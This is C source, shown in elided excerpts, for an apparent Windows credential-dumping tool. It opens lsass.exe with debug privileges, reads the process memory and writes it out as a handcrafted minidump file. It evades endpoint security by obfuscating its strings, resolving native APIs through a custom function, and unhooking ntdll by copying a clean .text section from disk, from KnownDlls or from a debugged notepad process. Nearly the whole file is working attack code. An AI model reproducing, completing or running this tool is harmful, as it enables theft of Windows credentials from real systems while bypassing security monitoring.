...
void EnableDebugPrivileges() {
    ...
    if (ntstatus != 0) {
        printf(AY_OBFUSCATE("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n"), ntstatus);
        exit(-1);
    }
    ...
    if (ntstatus != 0) {
        printf(AY_OBFUSCATE("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X. Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue.\n"), ntstatus);
        NtClose(tokenHandle);
        exit(-1);
    }
    ...
    printf(AY_OBFUSCATE("[+] Debug privileges enabled successfully.\n"));
}
...
ModuleInformation* add_module(ModuleInformation* list, int counter, ModuleInformation new_module) {
    ...
    if (counter >= size) {
        ...
        if (list == NULL) {
            printf(AY_OBFUSCATE("[-] Memory allocation failed!\n"));
            return NULL;
        }
    }
...
ModuleInformation* CustomGetModuleHandle(HANDLE hProcess) {
    ...
    if (ntstatus != 0) {
        printf(AY_OBFUSCATE("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n"), ntstatus);
        return NULL;
    }
    ...
    printf(AY_OBFUSCATE("[+] PEB Address: \t0x%p\n"), pebaddress);
    ...
    printf(AY_OBFUSCATE("[+] Ldr Pointer: \t0x%p\n"), ldr_pointer);
    printf(AY_OBFUSCATE("[+] Ldr Adress: \t0x%p\n"), ldr_adress);
...
PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    ...
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf(AY_OBFUSCATE("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x%X reading address 0x%p\n"), ntstatus, mem_address);
        return NULL;
    }
...
char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    ...
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf(AY_OBFUSCATE("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x%X reading address 0x%p\n"), ntstatus, mem_address);
    }
...
MemFile* ReadMemReg(LPVOID hProcess, int* memfile_count_out) {
    ...
    while ((long long)mem_address < proc_max_address_l) {
        ...
        if (ntstatus != 0) {
            printf(AY_OBFUSCATE("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x%lx\n"), ntstatus);
        }
        ...
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            ...
            if (buffer == NULL) {
                printf(AY_OBFUSCATE("[-] Failed to allocate memory for buffer\n"));
                return NULL;
            }
            ...
            if (status != 0 && status != 0x8000000D) { // 0x8000000D = Partial copy so its ok
                printf(AY_OBFUSCATE("[-] NtReadVirtualMemory failed with status: 0x%X\n"), status);
            }
    ...
    *memfile_count_out = memfile_count;
    ...
    if (new_memfile_list == NULL) {
        printf(AY_OBFUSCATE("[-] Memory allocation failed for MemFile array!\n"));
        exit(1);
    }
...
ModuleInformation* GetModuleInfo(LPVOID* outputHandle, int* module_counter_out) {
    ...
    HANDLE hProcess = GetProcessByName(AY_OBFUSCATE("c:\\windows\\system32\\lsass.exe"));
    *outputHandle = (LPVOID)hProcess;
    printf(AY_OBFUSCATE("[+] Process handle:\t%d\n"), hProcess);
...
OSVERSIONINFOW GetOSInfo() {
    ...
    if (RtlGetVersion(&osvi) == 0) {
        ...
        printf(AY_OBFUSCATE("[-] Error: RtlGetVersion call failed\n"));
        return osvi;
    }
}
...
void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
    ...
    if (!VirtualProtect(localNtdllTxt, localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        printf(AY_OBFUSCATE("[-] Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)\n"));
        ExitProcess(0);
    }
    // getchar();
    ...
    if (!VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        printf(AY_OBFUSCATE("[-] Error calling VirtualProtect (dwOldProtection)\n"));
        ExitProcess(0);
    }
}
...
int* GetTextSectionInfo(LPVOID ntdll_address) {
    ...
    if (!ReadProcessMemory(hProcess, ntdll_address, signature_dos_header, 2, &bytesRead) || bytesRead != 2) {
        printf(AY_OBFUSCATE("[-] Error reading DOS header signature\n"));
        ExitProcess(0);
    }

    if (signature_dos_header[0] != 'M' || signature_dos_header[1] != 'Z') {
        printf(AY_OBFUSCATE("[-] Incorrect DOS header signature\n"));
        ExitProcess(0);
    }
    ...
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + 0x3C, &e_lfanew, 4, &bytesRead) || bytesRead != 4) {
        printf(AY_OBFUSCATE("[-] Error reading e_lfanew\n"));
        ExitProcess(0);
    }
    ...
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew, signature_nt_header, 2, &bytesRead) || bytesRead != 2) {
        printf(AY_OBFUSCATE("[-] Error reading NT header signature\n"));
        ExitProcess(0);
    }

    if (signature_nt_header[0] != 'P' || signature_nt_header[1] != 'E') {
        printf(AY_OBFUSCATE("[-] Incorrect NT header signature\n"));
        ExitProcess(0);
    }
    ...
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24, &optional_header_magic, 2, &bytesRead) || bytesRead != 2) {
        printf(AY_OBFUSCATE("[-] Error reading Optional Header Magic\n"));
        ExitProcess(0);
    }

    if (optional_header_magic != 0x20B && optional_header_magic != 0x10B) {
        printf(AY_OBFUSCATE("[-] Incorrect Optional Header Magic field value\n"));
        ExitProcess(0);
    }
    ...
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 4, &sizeofcode, 4, &bytesRead) || bytesRead != 4) {
        printf(AY_OBFUSCATE("[-] Error reading SizeOfCode\n"));
        ExitProcess(0);
    }
    ...
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 20, &baseofcode, 4, &bytesRead) || bytesRead != 4) {
        printf(AY_OBFUSCATE("[-] Error reading BaseOfCode\n"));
        ExitProcess(0);
    }
...
LPVOID GetModuleAddress(const char* dll_name) {
    ...
    //printf(AY_OBFUSCATE("[+] pbi_addr: \t\t0x%p \n"), pbi_addr);
    //printf(AY_OBFUSCATE("[+] peb pointer: \t0x%p\n"), peb_pointer);
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
...
LPVOID MapNtdllFromDisk(const char* ntdll_path) {
    ...
    if (hFile == INVALID_HANDLE_VALUE) {
        printf(AY_OBFUSCATE("[-] Error calling CreateFileA\n"));
        ExitProcess(0);
    }
    ...
    if (hSection == NULL) {
        printf(AY_OBFUSCATE("[-] Error calling CreateFileMappingA\n"));
        CloseHandle(hFile);
        ExitProcess(0);
    }
    ...
    if (pNtdllBuffer == NULL) {
        printf(AY_OBFUSCATE("[-] Error calling MapViewOfFile\n"));
    ...
    if (!CloseHandle(hFile) || !CloseHandle(hSection)) {
        printf(AY_OBFUSCATE("[-] Error calling CloseHandle\n"));
        ExitProcess(0);
    }
...
LPVOID MapNtdllFromKnownDlls() {
    ...
    if (status != 0) {
        wprintf(AY_OBFUSCATE(L"[-] Error calling NtOpenSection. NTSTATUS: 0x%X\n"), status);
        ExitProcess(0);
    }

    PVOID pNtdllBuffer = MapViewOfFile(hSection, SECTION_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        wprintf(AY_OBFUSCATE(L"[-] Error calling MapViewOfFile\n"));
        ExitProcess(0);
    }

    status = NtClose(hSection);
    if (status != 0) {
        wprintf(AY_OBFUSCATE(L"[-] Error calling CloseHandle\n"));
        ExitProcess(0);
    }
...
LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
    ...
    if (!createprocess_res) {
        printf(AY_OBFUSCATE("[-] Error calling CreateProcess\n"));
        ExitProcess(0);
    }

    HANDLE localNtdllHandle = GetModuleAddress(AY_OBFUSCATE("ntdll.dll"));
    ...
    if (!readprocmem_res) {
        printf(AY_OBFUSCATE("[-] Error calling ReadProcessMemory\n"));
        ExitProcess(0);
    }
    ...
    if (!debugstop_res || !terminateproc_res) {
        printf(AY_OBFUSCATE("[-] Error calling DebugActiveProcessStop or TerminateProcess\n"));
        ExitProcess(0);
    }
...
void ReplaceLibrary(const char* option) {
    ...
    if (strcmp(option, AY_OBFUSCATE("disk")) == 0) {
        // printf(AY_OBFUSCATE("[+] Option: Disk\n"));
        const char* ntdll_path = AY_OBFUSCATE("C:\\Windows\\System32\\ntdll.dll");
        LPVOID unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
        unhookedNtdllTxt = (long long)unhookedNtdllHandle + offset_mappeddll;
    }
    else if (strcmp(option, AY_OBFUSCATE("knowndlls")) == 0) {
        // printf(AY_OBFUSCATE("[+] Option: Knowndlls\n"));
        LPVOID unhookedNtdllHandle = MapNtdllFromKnownDlls();
        unhookedNtdllTxt = (long long)unhookedNtdllHandle + offset_mappeddll;
    }
    else if (strcmp(option, AY_OBFUSCATE("debugproc")) == 0) {
        // printf(AY_OBFUSCATE("[+] Option: Debugproc\n"));
        const char* proc_path = AY_OBFUSCATE("c:\\Windows\\System32\\notepad.exe");
    ...
    const char* targetDll = AY_OBFUSCATE("ntdll.dll");
    ...
    printf(AY_OBFUSCATE("[+] Copying %d bytes from 0x%p to 0x%p.\n"), localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);
...
void* CustomGetProcAddress(void* pDosHdr, const char* func_name) {
    ...
    // printf(AY_OBFUSCATE("[*] e_lfanew: \t\t\t\t\t0x%X\n"), e_lfanew_value);
    ...
    // printf(AY_OBFUSCATE("[*] SizeOfOptionalHeader: \t\t\t0x%X\n"), sizeopthdr_value);
    ...
    // printf(AY_OBFUSCATE("[*] exportTableRVA address: \t\t\t0x%X\n"), exportTableRVA_value);
    if (exportTableRVA_value != 0) {
        ...
        // printf(AY_OBFUSCATE("[*] numberOfNames: \t\t\t\t0x%X\n"), numberOfNames_value);
        ...
        // printf(AY_OBFUSCATE("[*] addressOfFunctionsVRA: \t\t\t0x%X\n"), addressOfFunctionsVRA_value);
        ...
        // printf(AY_OBFUSCATE("[*] addressOfNamesVRA: \t\t\t\t0x%X\n"), addressOfNamesVRA_value);
        ...
        // printf(AY_OBFUSCATE("[*] addressOfNameOrdinalsVRA: \t\t\t0x%X\n"), addressOfNameOrdinalsVRA_value);
...
void initializeFunctions() {
    HMODULE hNtdll = LoadLibraryA(AY_OBFUSCATE("ntdll.dll"));
    NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, AY_OBFUSCATE("NtQueryInformationProcess"));
    NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress((HMODULE)hNtdll, AY_OBFUSCATE("NtReadVirtualMemory"));

    RtlGetVersion = (RtlGetVersionPtr)CustomGetProcAddress(hNtdll, AY_OBFUSCATE("RtlGetVersion"));
    NtClose = (NtCloseFn)CustomGetProcAddress(hNtdll, "NtClose");
    NtOpenProcessToken = (NtOpenProcessTokenFn)CustomGetProcAddress(hNtdll, AY_OBFUSCATE("NtOpenProcessToken"));
    NtAdjustPrivilegesToken = (NtAdjustPrivilegesTokenFn)CustomGetProcAddress(hNtdll, AY_OBFUSCATE("NtAdjustPrivilegesToken"));
    NtGetNextProcess = (NtGetNextProcessFn)CustomGetProcAddress(hNtdll, AY_OBFUSCATE("NtGetNextProcess"));
    NtQueryVirtualMemory = (NtQueryVirtualMemory_t)CustomGetProcAddress(hNtdll, AY_OBFUSCATE("NtQueryVirtualMemory"));
    NtOpenSection = (NtOpenSectionFn)CustomGetProcAddress(hNtdll, AY_OBFUSCATE("NtOpenSection"));
}
...
uint8_t* get_dump_bytearr(OSVERSIONINFOW osvi, 
    ...
    printf(AY_OBFUSCATE("[+] Total number of modules: \t%d\n"), number_modules);
    printf(AY_OBFUSCATE("[+] ModuleListStream size:   \t%d\n"), modulelist_size);
    printf(AY_OBFUSCATE("[+] Mem64List offset: \t\t%d\n"), mem64list_offset);
    printf(AY_OBFUSCATE("[+] Mem64List size: \t\t%d\n"), mem64list_size);
    ...
    *(uint64_t*)(memory64list_stream + memory64list_stream_offset) = offset_memory_regions;
    ...
    for (int i = 0; i < mem64list_len; i++) {
        ...
        memory64list_stream_offset += 8;
        // printf(AY_OBFUSCATE("[+] address:\t0x%p\t Offset:\t %d\n"), address, memory64list_stream_offset);
    }
...
void WriteToFile(const char* filename, uint8_t* data, size_t length) {
    ...
    if (err != 0) {
        perror(AY_OBFUSCATE("[-] Error opening file"));
        return;
    }
    ...
    if (written != length) {
        perror(AY_OBFUSCATE("[-] Error writing to file"));
    }

    // Close the file
    fclose(file);
    printf(AY_OBFUSCATE("[+] File %s created correctly."), filename);
}
...
int main(int argc, char* argv[]) {
    ...
    // Input arguments
    const char* ntdll_option = AY_OBFUSCATE("default");
    const char* dump_fname = AY_OBFUSCATE("native.dmp");
    const char* key_xor = "";
    if (argc >= 2)
    {
        ntdll_option = argv[1];
